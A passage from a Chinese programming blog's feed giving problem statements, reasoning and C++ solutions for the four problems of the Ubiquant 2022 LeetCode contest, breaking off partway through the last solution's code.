<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>九坤投资专场竞赛</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/27/</url>
    <content><![CDATA[<h2 id="九坤投资专场竞赛"><a href="#九坤投资专场竞赛" class="headerlink" title="九坤投资专场竞赛"></a>九坤投资专场竞赛</h2><p>比赛的题目质量还是挺高的，第四题还是蛮有意思的题目，前三题都水题了。</p>
<h4 id="九坤-01-可以读通讯稿的组数"><a href="#九坤-01-可以读通讯稿的组数" class="headerlink" title="九坤-01. 可以读通讯稿的组数"></a>九坤-01. 可以读通讯稿的组数</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>校运动会上，所有参赛同学身上都贴有他的参赛号码。某班参赛同学的号码记于数组 <code>nums</code> 中。假定反转后的号码称为原数字的「镜像号码」。如果 <strong>两位同学</strong> 满足条件：镜像号码 A + 原号码 B &#x3D; 镜像号码 B + 原号码 A，则这两位同学可以到广播站兑换一次读通讯稿的机会，为同班同学加油助威。请返回所有参赛同学可以组成的可以读通讯稿的组数，并将结果对<code>10^9+7</code>取余。</p>
<p>注意：</p>
<ol>
<li>镜像号码中如存在前置零，则忽略前置零。</li>
<li>同一位同学可有多次兑换机会。</li>
</ol>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<code>nums = [17,28,39,71]</code></p>
<p>输出：<code>3</code></p>
<p>解释：<br>共有三对同学，分别为 [17,28]、[17,39]、[28,39]。其中：<br>第一对同学：17 + 82 &#x3D; 71 + 28；<br>第二对同学：17 + 93 &#x3D; 71 + 39；<br>第三对同学：28 + 93 &#x3D; 82 + 39。</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<code>nums = [71, 60]</code></p>
<p>输出：<code>1</code></p>
<p>解释：<br>共有一对同学，为 [71, 60]。<br>因为 71 + 6 &#x3D; 17 + 60，此处 60 的镜像号码为 6，前导零被忽略。</p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= nums.length &lt;= 10^6</code></li>
<li><code>0 &lt;= nums[i] &lt;= 10^9</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/ubiquant2022/problems/xdxykd/">https://leetcode.cn/contest/ubiquant2022/problems/xdxykd/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希统计
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>常规题目了，等式变换即可，镜像号码 A + 原号码 B &#x3D; 镜像号码 B + 原号码 A 变换为: 镜像号码 A  - 原号码 A &#x3D; 镜像号码 B - 原号码 B。我们只需要统计 $x$ 减去镜像 $x$ 的数目 $y$ 即可，此时构成的相等的个数为 $\dfrac{y \times (y - 1)}{2}$，我们依次统计所有的数目之和即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfPairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            string s = <span class="built_in">to_string</span>(v);</span><br><span class="line">            <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">stoi</span>(s);</span><br><span class="line">            cnt[v - x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [x, freq] : cnt) &#123;</span><br><span class="line">            ans += (<span class="type">long</span> <span class="type">long</span>)freq * (freq - <span class="number">1</span>) / <span class="number">2</span> % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="九坤-02-池塘计数"><a href="#九坤-02-池塘计数" class="headerlink" title="九坤-02. 池塘计数"></a>九坤-02. 池塘计数</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>最近的降雨，使田地中的一些地方出现了积水，<code>field[i][j]</code> 表示田地第 <code>i</code> 行 <code>j</code> 列的位置有：</p>
<ul>
<li>若为 <code>W</code>, 表示该位置为<strong>积水</strong>；</li>
<li>若为 <code>.</code>, 表示该位置为<strong>旱地</strong>。</li>
</ul>
<p>已知一些相邻的积水形成了若干个池塘，若以 <code>W</code> 为中心的八个方向相邻积水视为同一片池塘。</p>
<p>请返回田地中池塘的数量。</p>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入: <code>field = [&quot;.....W&quot;,&quot;.W..W.&quot;,&quot;....W.&quot;,&quot;.W....&quot;,&quot;W.WWW.&quot;,&quot;.W....&quot;]</code></p>
<p>输出：<code>3</code></p>
<p>解释：如下图所示，共有 3 个池塘：<br><img src="https://pic.leetcode-cn.com/1658733123-loBxlt-image.png" alt="image.png"></p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入: <code>field = [&quot;W....W&quot;,&quot;.W..W.&quot;,&quot;..W.W.&quot;,&quot;W..W..&quot;,&quot;W.W...&quot;,&quot;.W....&quot;]</code></p>
<p>输出：<code>1</code></p>
<p>解释：如下图所示，共有 1 个池塘：<br><img src="https://pic.leetcode-cn.com/1658733194-lvWHJj-image.png" alt="image.png"></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= field.length, field[i].length &lt;= 100</code></li>
<li><code>field</code> 中仅包含 <code>W</code> 和 <code>.</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/ubiquant2022/problems/3PHTGp/">https://leetcode.cn/contest/ubiquant2022/problems/3PHTGp/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>BFS 或者 并查集
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>没啥好说的直接 $8$ 个方向的 $BFS$ 遍历即可，非常简单的模板题。另一种解法为并查集，感觉也是模板，没啥好说的。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \times m)$，$n, m$ 表示矩阵的行与列。</li>
<li>空间复杂度：时间复杂度为 $O(n \times m)$，$n, m$ 表示矩阵的行与列。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li><code>BFS</code></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lakeCount</span><span class="params">(vector&lt;string&gt;&amp; field)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = field.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = field[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">visit</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; qu;</span><br><span class="line">        <span class="type">int</span> dir[<span class="number">8</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!visit[i][j] &amp;&amp; field[i][j] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                    ans++;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(i, j);</span><br><span class="line">                    visit[i][j] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> [x, y] = qu.<span class="built_in">front</span>();</span><br><span class="line">                        qu.<span class="built_in">pop</span>();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++) &#123;</span><br><span class="line">                            <span class="type">int</span> nx = x + dir[k][<span class="number">0</span>];</span><br><span class="line">                            <span class="type">int</span> ny = y + dir[k][<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; ny &lt; n &amp;&amp; !visit[nx][ny] &amp;&amp; field[nx][ny] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                                visit[nx][ny] = <span class="literal">true</span>;</span><br><span class="line">                                qu.<span class="built_in">emplace</span>(nx, ny);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="6158-九坤-03-数字默契考验"><a href="#6158-九坤-03-数字默契考验" class="headerlink" title="6158. 九坤-03. 数字默契考验"></a>6158. 九坤-03. 数字默契考验</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>某数学兴趣小组有 N 位同学，编号为 0 ~ N-1，老师提议举行一个数字默契小测试：首先每位同学想出一个数字，按同学编号存于数组 <code>numbers</code>。每位同学可以选择将自己的数字进行放大操作，每次在以下操作中任选一种（放大操作不限次数，可以不操作）：</p>
<ol>
<li>将自己的数字乘以 2</li>
<li>将自己的数字乘以 3</li>
</ol>
<p>若最终所有同学可以通过操作得到相等数字，则返回所有同学的最少操作次数总数；否则请返回 -1。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：numbers = [50, 75, 100]</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">numbers[0] * 2 * 3 = 300 操作两次；</span><br><span class="line">numbers[1] * 2 * 2 = 300 操作两次；</span><br><span class="line">numbers[2] * 3 = 300 操作一次。共计操作五次。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：numbers = [10, 14]</span><br><span class="line">输出：-1</span><br><span class="line">解释：无法通过操作得到相同数字。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= numbers.length &lt;= 10^5</code></li>
<li><code>1 &lt;= numbers[i] &lt;= 10^9</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/ubiquant2022/problems/uGuf0v/">https://leetcode.cn/contest/ubiquant2022/problems/uGuf0v/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>本质是我们求出 $numbers$ 数组中所有元素的最小公倍数 $x$，然后分别检测数组的每个元素 $\dfrac{x}{numbers[i]}$ 是否只包含因子 $2$ 与因子 $3$，当然求最小公倍数会溢出，所以这个方法需要稍微一点技巧，就时首先将所有元素去掉其中最大公约数。</li>
<li>数组 $nums$ 的所有元素 $nums[i]$ 去掉质因子 $2,3$ 以后的值为 $p[i]$，此时所有元素含有的 $p[i]$ 含有的质因子一定相同，否则两个元素不可能通过乘以 $2,3$ 变为相同元素，这个可以很容易证明。假设 $x &#x3D; \prod_{i&#x3D;1}^{n}\limits p_i^{c_i}, y &#x3D; \prod_{i&#x3D;1}^{m}\limits p_i^{c_i}$，如果 $x$ 与 $y$ 可以通过乘以 $2,3$ 变为相同的数，则两个数一定含有相同的质因子。此时我们只需要求出所有元素含有的因子 $2,3$ 的最大数目 $cnt_1, cnt_2$，则最终的数含有的 $2,3$ 因子的最大数目为 $cnt_1, cnt_2$。</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \log n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 为数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">check</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            ret++;</span><br><span class="line">            x /= <span class="number">2</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">while</span> (x % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            ret++;</span><br><span class="line">            x /= <span class="number">3</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (x != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; numbers)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = numbers.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxGcd = numbers[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : numbers) &#123;</span><br><span class="line">            maxGcd = __gcd(maxGcd, v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            numbers[i] /= maxGcd;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(numbers.<span class="built_in">begin</span>(), numbers.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> curr = numbers[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> x = (<span class="type">long</span> <span class="type">long</span>)curr * numbers[i] /__gcd(curr, (<span class="type">long</span> <span class="type">long</span>)numbers[i]);</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> a = x / curr;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> b = x / numbers[i];</span><br><span class="line">            <span class="type">int</span> ca = <span class="built_in">check</span>(a);</span><br><span class="line">            <span class="type">int</span> cb = <span class="built_in">check</span>(b);</span><br><span class="line">            <span class="keyword">if</span> (ca == <span class="number">-1</span> || cb == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            curr = x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            ans += <span class="built_in">check</span>(curr / numbers[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>数学<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt1</span><span class="params">(n)</span>, <span class="title">cnt2</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                nums[i] /= <span class="number">2</span>;</span><br><span class="line">                cnt1[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(nums[i] %<span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                nums[i] /= <span class="number">3</span>;</span><br><span class="line">                cnt2[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] != nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxCnt1 = *<span class="built_in">max_element</span>(cnt1.<span class="built_in">begin</span>(), cnt1.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> maxCnt2 = *<span class="built_in">max_element</span>(cnt2.<span class="built_in">begin</span>(), cnt2.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            ans += maxCnt1 - cnt1[i];</span><br><span class="line">            ans += maxCnt2 - cnt2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="九坤-04-筹码游戏"><a href="#九坤-04-筹码游戏" class="headerlink" title="九坤-04. 筹码游戏"></a>九坤-04. 筹码游戏</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>九坤很喜欢玩德州扑克，但是有一个神奇的周五，大家都去加班了，于是九坤只能研究起了桌上的筹码。</p>
<p>他把所有的筹码都放入了一个纸箱中，并按以下规则向外抽取筹码：</p>
<ul>
<li><p>每次抽取仅取出 <code>1</code> 个筹码</p>
</li>
<li><p>如果对本次取出的筹码不满意，会将该筹码放回并重新抽取，直到确定想要这个筹码。</p>
</li>
<li><p>对于取出的筹码，他会将相同面值的筹码放在一堆</p>
<blockquote>
<p>例如：抽取了 <code>6</code> 个筹码，<code>3</code> 个 <code>10</code>，<code>2</code> 个 <code>5</code>，<code>1</code>个 <code>1</code>，那么他就会把这些筹码放成三堆，数量分别是3、2、1。</p>
</blockquote>
</li>
</ul>
<p>纸箱中共有 <code>kind</code> 种面值的筹码。现给定九坤取出筹码的最终目标为 <code>nums</code>， <code>nums[i]</code> 表示第 <code>i</code> 堆筹码的数量。<br>假设每种面值的筹码都有无限多个，且九坤总是遵循最优策略，使得他达成目标的操作次数最小化。<br>请返回九坤达成目标的情况下，需要取出筹码次数的<strong>期望值</strong>。</p>
<p><strong>注意：</strong></p>
<ul>
<li>最终取出的筹码中，对于任意两堆筹码的面值都是不同的。</li>
<li>不需要考虑筹码堆的顺序（例如，[3,1,1]、[1,1,3] 这两个筹码堆是相同的）</li>
</ul>
<p><strong>示例 1:</strong></p>
<blockquote>
<p>输入：<br><code>nums = [1,1]</code><br><code>kind = 2</code><br>输出：<code>3.00000</code></p>
<p>解释：共有 2 种筹码，初始取出的数量为 <code>[0,0]</code><br>第一次取出筹码后，筹码数量为 <code>[1,0]</code>，此时取了 <code>1</code> 次<br>第二次取出筹码后，筹码数量为 <code>[2,0]</code> 和 <code>[1,1]</code> 的概率均为 <code>0.5</code><br>因此，在 [1,0] 的基础上取出 <code>[1,1]</code> 的次数期望值为 <code>2</code><br>总期望值为 <code>1+2=3</code></p>
</blockquote>
<p><strong>示例 2:</strong></p>
<blockquote>
<p>输入：<br><code>nums = [1,2]</code><br><code>kind = 4</code><br>输出：<code>3.833333</code></p>
<p>解释：<code>1 + 1 + 1/4 * 4/3 + 3/4 * 4/2 = 23 / 6</code></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= kind &lt;= 50</code></li>
<li><code>1 &lt;= nums.length &lt;= kind</code></li>
<li><code>sum(nums[0],nums[1],...,nums[n]) &lt;= 50</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/ubiquant2022/problems/I3Gm2h/">https://leetcode.cn/contest/ubiquant2022/problems/I3Gm2h/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>数论与概率
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>该题目重点是对求期望的理解。定义状态为一个数组 $[c_0, c_1, c_2, c_3, \cdots, c_m-1]$，$c_i$ 表示当前已抽取的不同种类的筹码的数量，设最终状态为 $nums$，且按照从小到大进行排序。设从状态 $s_0$ 到 最终状态的期望为 $E_{s_0}$，而 $s_0$ 在经过一次抽取后有以下两种情况：</li>
</ol>
<ul>
<li>合法的状态：设合法的状态为 $s_1, s_2, s_3, \cdots,s_{t-1}$，且每个状态中的数量都是按照从小到大进行排列，此时合法状态 $i$ 中每个元素 $c_{ij}$ 一定满足 $c_{ij} \le nums_{j}$，否则就不能称为合法状态。设从状态 $s_0$ 变为合法状态 $s_1, s_2, s_3, \cdots,s_{t}$ 的概率为 $p_1,p_2, \cdots, p_{t-1}$，设合法状态 $s_1, s_2, s_3, \cdots,s_{t}$ 的变为最终状态的期望为 $E_1,E_2, \cdots, E_{t}$。</li>
<li>非法状态：即此时非法状态 $s_1^{‘},s_2^{‘},s_3^{‘}, \cdots, s_k^{‘}$ 出现了 $c_{ij} \le nums_{j}$，按照题目要求如果出现了非法状态，我们应当将选择的筹码放回重新抽取，则状态 $s_i^{‘}$ 又回到了初始化状态 $s_0$。设从状态 $s_0$ 变为非法法状态 $s_1^{‘}, s_2^{‘}, s_3^{‘}, \cdots,s_{k}^{‘}$ 的概率为 $p_1^{‘},p_2^{‘}, \cdots, p_{k}^{‘}$，也即 $s_0$ 继续停留在状态 $s_0$ 的概率为 $\sum_{i&#x3D;1}^{k} \limits p_i^{‘}$。</li>
</ul>
<p>则此时我们可以知道状态 $s_0$ 的期望如下:<br>$$<br>E_{s_0} &#x3D; \sum_{i&#x3D;1}^{t}(E_{s_i} + 1) * p_i + \sum_{i&#x3D;1}^{k}(E_{s_0} + 1) * p_i^{‘} \<br>$$<br>由于我们知道状态转换只有两种可能，要么为非法要么为合法状态，因此可以知道：$$\sum_{i&#x3D;1}^{t} \limits p_i + \sum_{i&#x3D;1}^{k} \limits p_i^{‘} &#x3D; 1$$<br>所以上述等式可以变换为如下:<br>$$<br>E_{s_0} &#x3D; \sum_{i&#x3D;1}^{t} (E_{s_i} + 1) * p_i + (1 - \sum_{i&#x3D;1}^{t}p_i) * (E_{s_0} + 1) \<br>&#x3D; \sum_{i&#x3D;1}^{t} E_{s_i} * p_i + (1 - \sum_{i&#x3D;1}^{t}p_i) * E_{s_0} + 1\<br>&#x3D; \frac{\sum_{i&#x3D;1}^{t} \limits E_{s_i} * p_i + 1}{1 - \sum_{i&#x3D;1}^{t} \limits p_i}<br>$$<br>2. 根据以上递推公式就非常好办了，初始时从状态 $s_0 &#x3D; [0,0,0,\cdots, 0]$ 开始搜索，状态 $s_0$ 可以转换的合法状态为 $s_1 &#x3D; [1,0,0,\cdots, 0]，s_2 &#x3D; [0,1,0,\cdots, 0]，s_3 &#x3D; [0,0,1,\cdots, 0]，\cdots$，一共有 $kind$ 种状态，可以进行如下减枝技巧：</p>
<ul>
<li>可以用哈希表存储每个状态，此时如果当前状态已经搜索过，则直接返回；</li>
<li>我们可以观察到，实际上从 $s_0$ 进行状态转移时，每种状态的概率均为 $\dfrac{1}{kind}$，所以此时就非常简单了，我们只需求出合法的状态数量即可。</li>
<li>合法状态实际上很多为同一种状态，可以进行合并，不需要每次都计算，$s_1 &#x3D; [1,0,0,\cdots, 0]，s_2 &#x3D; [0,1,0,\cdots, 0]，s_3 &#x3D; [0,0,1,\cdots, 0]，\cdots$ 这些状态均为同一种状态。我们按照从小到大进行排序，每次选择在相同的元素的末尾的一个元素进行加 $1$ 即可，即可减少状态计算。</li>
</ul>
<ol start="3">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(kind \times sum(nums))$，其中 $sum(nums)$ 表示数组中所有元素的和，$kind$ 表示筹码的种类。</li>
<li>空间复杂度：$O(sum(nums))$，最终只含有 $sum(nums)$ 种状态。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">chipGame</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> kind)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> total = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        nums.<span class="built_in">resize</span>(kind);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">curr</span><span class="params">(kind)</span></span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        map&lt;vector&lt;<span class="type">int</span>&gt;, <span class="type">double</span>&gt; memo;</span><br><span class="line"></span><br><span class="line">        function&lt;<span class="type">double</span>(vector&lt;<span class="type">int</span>&gt;&amp;, <span class="type">int</span>)&gt; dfs = [&amp;](vector&lt;<span class="type">int</span>&gt; &amp;state, <span class="type">int</span> m)-&gt;<span class="type">double</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (memo.<span class="built_in">count</span>(state)) &#123;</span><br><span class="line">                <span class="keyword">return</span> memo[state];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">double</span> ret = <span class="number">0.0</span>;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; kind; i = j) &#123;</span><br><span class="line">                j = i;</span><br><span class="line">                <span class="keyword">while</span> (j &lt; kind &amp;&amp; state[j] == state[i]) &#123;</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                state[j - <span class="number">1</span>]++;</span><br><span class="line">                <span class="keyword">if</span> (state[j - <span class="number">1</span>] &lt;= nums[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                    ret += <span class="built_in">dfs</span>(state, m - <span class="number">1</span>) * (j - i) / 